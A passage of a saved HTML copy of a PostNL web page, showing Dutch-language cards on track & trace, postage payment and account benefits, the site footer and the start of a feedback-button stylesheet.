href="https://www.postnl.nl/ontvangen/pakket-ontvangen/pakket-en-briefautomaat/" target="_self"><span class="stamp-button__content">Zo werkt het</span></a></div></div></div></div></div></div></div></section><section class="outer"><div class="inner inner--mobile-full" bis_skin_checked="1"><div class="pci-card-block pci-card-block--basic " bis_skin_checked="1"><div class="pci-card-block__cards pci-card-block--text-right pci-card-block--grid pci-card-block--grid-col-2" bis_skin_checked="1"><div class="stamp-card stamp-card--size-full stamp-card--theme-default" bis_skin_checked="1"><div class="stamp-card__inner" bis_skin_checked="1"><div class="stamp-card__header" bis_skin_checked="1"><div class="stamp-flex stamp-flex--direction-column stamp-flex--row-gap-mobile-l stamp-flex--column-gap-mobile-l" bis_skin_checked="1"><picture class="pci-card__image pci-picture pci-picture__illustration"><source srcset="phone-tracktrace.svg 1x, phone-tracktrace.svg 2x"><img src="phone-tracktrace.svg" alt="" loading="lazy"></picture><h3 class="stamp-heading stamp-heading--size-m stamp-heading--color-subtle">Pakketje onderweg?</h3></div></div><div class="stamp-card__body" bis_skin_checked="1"><div class="rich-text " bis_skin_checked="1"><p>Op track &amp; trace zie je wanneer de bezorger voor de deur staat.</p></div></div><div class="stamp-card__footer" bis_skin_checked="1"><div class="stamp-card-link" bis_skin_checked="1"><a class="stamp-card-link__link stamp-card-link__link--block stamp-link stamp-link--size-l" href="https://jouw.postnl.nl/track-and-trace/" target="_self"><span class="stamp-link__content">Naar track &amp; trace<div class="stamp-link__icon stamp-link__icon--end" aria-hidden="true" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></a></div></div></div></div><div class="stamp-card stamp-card--size-full stamp-card--theme-default" bis_skin_checked="1"><div class="stamp-card__inner" bis_skin_checked="1"><div class="stamp-card__header" bis_skin_checked="1"><div class="stamp-flex stamp-flex--direction-column stamp-flex--row-gap-mobile-l stamp-flex--column-gap-mobile-l" bis_skin_checked="1"><picture class="pci-card__image pci-picture pci-picture__illustration"><source srcset="mail-exclamation-mark.svg 1x, mail-exclamation-mark.svg 2x"><img src="mail-exclamation-mark.svg" alt="" loading="lazy"></picture><h3 class="stamp-heading stamp-heading--size-m stamp-heading--color-subtle">Portokosten</h3></div></div><div class="stamp-card__body" bis_skin_checked="1"><div class="rich-text " bis_skin_checked="1"><p>Verkeerd label of postzegel te weinig geplakt? Hier kun je het verschil bijbetalen.</p></div></div><div class="stamp-card__footer" bis_skin_checked="1"><div class="stamp-card-link" bis_skin_checked="1"><a class="stamp-card-link__link stamp-card-link__link--block stamp-link stamp-link--size-l" href="https://jouw.postnl.nl/porto/" target="_self"><span class="stamp-link__content">Naar betaalpagina<div class="stamp-link__icon stamp-link__icon--end" aria-hidden="true" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></a></div></div></div></div></div></div></div></section><section class="outer"><div class="inner inner--mobile-full" bis_skin_checked="1"><div class="pci-card-block pci-card-block--emphasis " bis_skin_checked="1"><div class="pci-card-block__cards pci-card-block--text-right" bis_skin_checked="1"><div class="default stamp-emphasis-card stamp-emphasis-card--size-full stamp-emphasis-card--image-start" bis_skin_checked="1"><div class="stamp-emphasis-card__image" bis_skin_checked="1"><picture class="pci-card__image pci-picture"><source srcset="account_tcm10-145292.webp 1x, account_tcm10-145292-1.webp 2x" media="(min-width: 1024px)"><source srcset="account_tcm10-145292-2.webp 1x, account_tcm10-145292-3.webp 2x" media="(min-width: 680px)"><source srcset="account_tcm10-145292-4.webp 1x, account_tcm10-145292-5.webp 2x"><img src="account_tcm10-145292-4.webp" alt="" loading="lazy"></picture></div><div class="stamp-emphasis-card__content" bis_skin_checked="1"><div class="stamp-emphasis-card__header" bis_skin_checked="1"><h2 class="stamp-heading stamp-heading--size-l stamp-heading--color-brand">De voordelen van een persoonlijk account</h2></div><div class="stamp-emphasis-card__body" bis_skin_checked="1"><div class="rich-text " bis_skin_checked="1"><ul><li>Eén overzicht voor al je pakketten</li><li>Zie welke post er naar je onderweg is met MijnPost</li><li>Kies zelf je bezorgtijd of -plaats met bezorgvoorkeuren</li></ul></div></div><div class="stamp-emphasis-card__footer" bis_skin_checked="1"><div class="pci-cta__container " bis_skin_checked="1"><a class="stamp-button stamp-button--variant-secondary stamp-button--size-full" href="https://jouw.postnl.nl/account/nieuw-account" target="_blank"><span class="stamp-button__content">PostNL-account aanmaken</span></a></div></div></div></div></div></div></div></section><section class="outer"><div class="inner" bis_skin_checked="1"><div class="ktv-element" bis_skin_checked="1"></div></div></section></main><footer><div bis_skin_checked="1"><div class="outer outer--flush" bis_skin_checked="1"><div class="outer outer--flush footer-dynamic" bis_skin_checked="1"><div class="inner" bis_skin_checked="1"><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle">Versturen</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/versturen/pakket-versturen/"><span class="stamp-link__content">Pakket versturen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/versturen/brief-of-kaart-versturen/"><span class="stamp-link__content">Brief of kaart versturen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/versturen/postzegels/"><span class="stamp-link__content">Postzegels</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/tarieven/"><span class="stamp-link__content">Tarieven</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://jouw.postnl.nl/online-versturen/nl-NL/pakket/kiezen?pst=sp-pnl-nav-verz-ql2-versturen/"><span class="stamp-link__content">Online frankeren</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/postzegels/"><span class="stamp-link__content">Postzegels kopen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/locatiewijzer/"><span class="stamp-link__content">PostNL-punten</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">Versturen</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle">Ontvangen</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/ontvangen/post-ontvangen/"><span class="stamp-link__content">Post ontvangen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/ontvangen/pakket-ontvangen/"><span class="stamp-link__content">Pakket ontvangen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/ontvangen/post-doorsturen/"><span class="stamp-link__content">Post doorsturen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://jouw.postnl.nl/track-and-trace/"><span class="stamp-link__content">Track &amp; trace</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/ontvangen/post-doorsturen/verhuisservice/"><span class="stamp-link__content">Verhuisservice</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://jouw.postnl.nl/porto/"><span class="stamp-link__content">Portokosten</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">Ontvangen</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle"> Zakelijke oplossingen </h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/post-versturen/"><span class="stamp-link__content">Post versturen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/pakket-versturen/"><span class="stamp-link__content">Pakket versturen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/logistieke-oplossingen/"><span class="stamp-link__content">Logistieke oplossingen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/ontvangen/"><span class="stamp-link__content">Ontvangen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/slimme-dataoplossingen/"><span class="stamp-link__content">Data oplossingen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/e-commerceplein/"><span class="stamp-link__content">E-commerce inspiratie</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/zakelijk/zakelijk-klant-worden/"><span class="stamp-link__content">Klant worden</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label"> Zakelijke oplossingen </span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle">Webshop</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/postzegels"><span class="stamp-link__content">Postzegels</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/verpakkingen"><span class="stamp-link__content">Verpakkingen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/kantoorartikelen"><span class="stamp-link__content">Kantoorartikelen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/cadeaus"><span class="stamp-link__content">Cadeaus</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/collect-club"><span class="stamp-link__content">Collect Club</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://shop.postnl.nl/webshop/zakelijke-hulpmiddelen"><span class="stamp-link__content">Zakelijke hulpmiddelen</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">Webshop</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div></div></div></div></div><div bis_skin_checked="1"><div class="outer outer--flush footer-static" bis_skin_checked="1"><div class="inner" bis_skin_checked="1"><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle">Direct regelen</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://jouw.postnl.nl/track-and-trace/"><span class="stamp-link__content">Track &amp; trace</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_blank" href="https://www.postnl.nl/postcode-zoeken/"><span class="stamp-link__content">Postcode zoeken</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://jouw.postnl.nl/online-versturen/nl-NL/pakket/kiezen?language=nl"><span class="stamp-link__content">Versturen</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/locatiewijzer/"><span class="stamp-link__content">PostNL-punten</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">Direct regelen</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-xs stamp-heading--color-subtle">PostNL-app</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s" href="https://apps.apple.com/nl/app/postnl/id513218878"><div class="stamp-link__icon stamp-link__icon--start" aria-hidden="true" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.8899 5.03365C15.5761 4.2305 16.038 3.11244 15.912 2C14.9229 2.03844 13.7269 2.63732 13.0174 3.44004C12.3816 4.15085 11.8248 5.28861 11.9749 6.37899C13.0774 6.46148 14.2038 5.83728 14.8899 5.03365ZM17.3627 12.0941C17.3903 14.9695 19.9714 15.9263 20 15.9384C19.9781 16.0059 19.5876 17.302 18.6401 18.6408C17.8211 19.7983 16.9711 20.9514 15.6321 20.9753C14.3164 20.9987 13.8933 20.2209 12.389 20.2209C10.8853 20.2209 10.4152 20.9514 9.1697 20.9987C7.8772 21.046 6.89295 19.7471 6.06714 18.5939C4.37971 16.235 3.09014 11.9282 4.82171 9.0211C5.68189 7.57737 7.21914 6.66315 8.88764 6.63976C10.1569 6.61631 11.3548 7.46539 12.1308 7.46539C12.9061 7.46539 14.3619 6.44432 15.8923 6.59425C16.533 6.62006 18.3314 6.84451 19.4863 8.47896C19.3933 8.53474 17.3404 9.69027 17.3627 12.0941Z" fill="currentColor"></path></svg></div><span class="stamp-link__content">iOS</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s" href="https://play.google.com/store/apps/details?id=nl.tpp.mobile.android&amp;hl=en&amp;gl=US"><div class="stamp-link__icon stamp-link__icon--start" aria-hidden="true" bis_skin_checked="1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" role="presentation"><path fill="currentColor" fill-rule="evenodd" d="M15.302 4.993c0-.299-.247-.542-.55-.542-.303 0-.55.243-.55.542 0 .298.247.534.55.534.303 0 .55-.236.55-.534zm-5.504 0c0-.299-.247-.542-.55-.542-.303 0-.55.243-.55.542 0 .298.247.534.55.534.303 0 .55-.236.55-.534zm-.55-2.135l-.994-1.7s-.045-.092.045-.142c.09-.05.147.036.147.036l1.009 1.716c.768-.337 1.631-.527 2.545-.527.913 0 1.777.19 2.545.527l1.01-1.716s.059-.086.149-.036c.089.05.041.141.041.141l-.993 1.7c1.809.874 3.034 2.584 3.034 4.546H6.213c0-1.962 1.226-3.672 3.035-4.545zm-3.081 13.85V8.067h11.665v8.643c0 .429-.527.99-.963.99H15.5v2.946c0 .75-.562 1.355-1.253 1.355-.691 0-1.246-.604-1.246-1.355V17.7h-2.003v2.946c0 .75-.555 1.355-1.246 1.355-.69 0-1.246-.604-1.246-1.355V17.7H7.13c-.436 0-.962-.561-.962-.99zm-1.92-8.823c.69 0 1.247.607 1.247 1.355v5.127c0 .748-.558 1.355-1.247 1.355-.689 0-1.247-.607-1.247-1.354V9.24c0-.748.558-1.355 1.247-1.355zM21 9.24c0-.748-.558-1.355-1.247-1.355-.689 0-1.247.607-1.247 1.355v5.127c0 .748.558 1.355 1.247 1.355.689 0 1.247-.607 1.247-1.354V9.24z" clip-rule="evenodd"></path><mask id="AndroidIcon__repclh836a" width="18" height="21" x="3" y="1" maskUnits="userSpaceOnUse"><path fill="currentColor" fill-rule="evenodd" d="M15.302 4.993c0-.299-.247-.542-.55-.542-.303 0-.55.243-.55.542 0 .298.247.534.55.534.303 0 .55-.236.55-.534zm-5.504 0c0-.299-.247-.542-.55-.542-.303 0-.55.243-.55.542 0 .298.247.534.55.534.303 0 .55-.236.55-.534zm-.55-2.135l-.994-1.7s-.045-.092.045-.142c.09-.05.147.036.147.036l1.009 1.716c.768-.337 1.631-.527 2.545-.527.913 0 1.777.19 2.545.527l1.01-1.716s.059-.086.149-.036c.089.05.041.141.041.141l-.993 1.7c1.809.874 3.034 2.584 3.034 4.546H6.213c0-1.962 1.226-3.672 3.035-4.545zm-3.081 13.85V8.067h11.665v8.643c0 .429-.527.99-.963.99H15.5v2.946c0 .75-.562 1.355-1.253 1.355-.691 0-1.246-.604-1.246-1.355V17.7h-2.003v2.946c0 .75-.555 1.355-1.246 1.355-.69 0-1.246-.604-1.246-1.355V17.7H7.13c-.436 0-.962-.561-.962-.99zm-1.92-8.823c.69 0 1.247.607 1.247 1.355v5.127c0 .748-.558 1.355-1.247 1.355-.689 0-1.247-.607-1.247-1.354V9.24c0-.748.558-1.355 1.247-1.355zM21 9.24c0-.748-.558-1.355-1.247-1.355-.689 0-1.247.607-1.247 1.355v5.127c0 .748.558 1.355 1.247 1.355.689 0 1.247-.607 1.247-1.354V9.24z" clip-rule="evenodd"></path></mask></svg></div><span class="stamp-link__content">Android</span></a></li></ul></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">PostNL App</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle">Hulp</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/klantenservice/"><span class="stamp-link__content">Service en contact</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/toegankelijkheid/"><span class="stamp-link__content">Toegankelijkheid</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/phishing/"><span class="stamp-link__content">Phishing</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">Hulp</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div><div class="footer-column" bis_skin_checked="1"><div class="pci-link-list" bis_skin_checked="1"><div class="pci-link-list__header" bis_skin_checked="1"><h4 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle">Over PostNL</h4></div><ul class="stamp-link-list"><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/over-postnl/"><span class="stamp-link__content">Over PostNL</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/over-postnl/beleggers/"><span class="stamp-link__content">Beleggers</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/over-postnl/pers-nieuws/"><span class="stamp-link__content">Pers en nieuws</span></a></li><li class="stamp-link-list-item"><a class="stamp-link stamp-link--size-s " target="_self" href="https://www.postnl.nl/werkenbij/"><span class="stamp-link__content">Werken bij PostNL</span></a></li></ul><div class="pci-cta__container" bis_skin_checked="1"></div></div><div class="pci-link-list--collapsible" bis_skin_checked="1"><div class="pci-collapsible" bis_skin_checked="1"><button class="pci-collapsible__trigger" type="button" aria-expanded="false"><span class="pci-collapsible__label">Over PostNL</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div></div></div><div class="outer outer--flush footer-global" bis_skin_checked="1"><div class="inner" bis_skin_checked="1"><div class="footer-global__container" bis_skin_checked="1"><span class="footer-global__brand"><img src="logo-postnl-outline.svg" alt="Postnl.nl">© Koninklijke PostNL</span><ul class="footer-global__links"><li><a class="stamp-link stamp-link--size-s" href="https://www.postnl.nl/privacy-verklaring/"><span class="stamp-link__content">Privacy</span></a></li><li><a class="stamp-link stamp-link--size-s" href="https://www.postnl.nl/cookie-verklaring/"><span class="stamp-link__content">Cookies</span></a></li><li><a class="stamp-link stamp-link--size-s" href="https://www.postnl.nl/gebruiksvoorwaarden/"><span class="stamp-link__content">Gebruiksvoorwaarden</span></a></li><li><a class="stamp-link stamp-link--size-s" href="https://www.postnl.nl/algemene-voorwaarden/"><span class="stamp-link__content">Algemene voorwaarden</span></a></li></ul></div></div></div></div></footer><pnl-cookie-wall-widget available-locales="nl_NL,en_GB" locale="nl_NL" class="hydrated" data-scrapbook-adoptedstylesheets="7" data-scrapbook-shadowdom=""></pnl-cookie-wall-widget></div></div><div data-live-region="assertive" aria-atomic="true" aria-relevant="additions" role="status" aria-live="assertive" style="position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" bis_skin_checked="1"></div><div data-live-region="polite" aria-atomic="true" aria-relevant="additions" role="status" aria-live="polite" style="position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" bis_skin_checked="1"></div></div><shop-messages></shop-messages><shop-toastr data-language="nl" class="hydrated" data-scrapbook-adoptedstylesheets="8,9" data-scrapbook-shadowdom="<shop-theme-provider class=&quot;hydrated&quot;><!----><div class=&quot;stamp-provider stamp-theme-light&quot;></div></shop-theme-provider>"></shop-toastr></div><next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p></next-route-announcer>



<div id="ZN_0kuV8DMgLAi0XJQ" bis_skin_checked="1"></div>

<style type="text/css">.QSIFeedbackButton div,.QSIFeedbackButton dl,.QSIFeedbackButton dt,.QSIFeedbackButton dd,.QSIFeedbackButton ul,.QSIFeedbackButton ol,.QSIFeedbackButton li,.QSIFeedbackButton h1,.QSIFeedbackButton h2,.QSIFeedbackButton h3,.QSIFeedbackButton h4,.QSIFeedbackButton h5,.QSIFeedbackButton h6,.QSIFeedbackButton span,.QSIFeedbackButton pre,.QSIFeedbackButton form,.QSIFeedbackButton fieldset,.QSIFeedbackButton textarea,.QSIFeedbackButton p,.QSIFeedbackButton blockquote,.QSIFeedbackButton tr,.QSIFeedbackButton th,.QSIFeedbackButton td{ margin: 0; padding: 0;background-color: transparent; border: 0; font-size: 12px; line-height: normal; vertical-align:baseline; box-shadow: none; }.QSIFeedbackButton img{ height: auto; width: auto; margin: 0; padding: 0 }.QSIFeedbackButton ul,.QSIFeedbackButton ol{ margin: 12px 0; padding-left: 40px; }.QSIFeedbackButton ul li{ list-style-type: disc; }.QSIFeedbackButton ol li{ list-style-type: decimal; }.QSIFeedbackButton .scrollable{ -webkit-overflow-scrolling: touch; }.QSIFeedbackButton table{ border-collapse: collapse; border-spacing: 0; }.QSIFeedbackButton table td{ padding: 2px; }.QSIFeedbackButton iframe{ max-height: none; }.QSIFeedbackButton *{ box-sizing: content-box; }</style><style type="text/css">/* Use classes below to override feedback button styles.
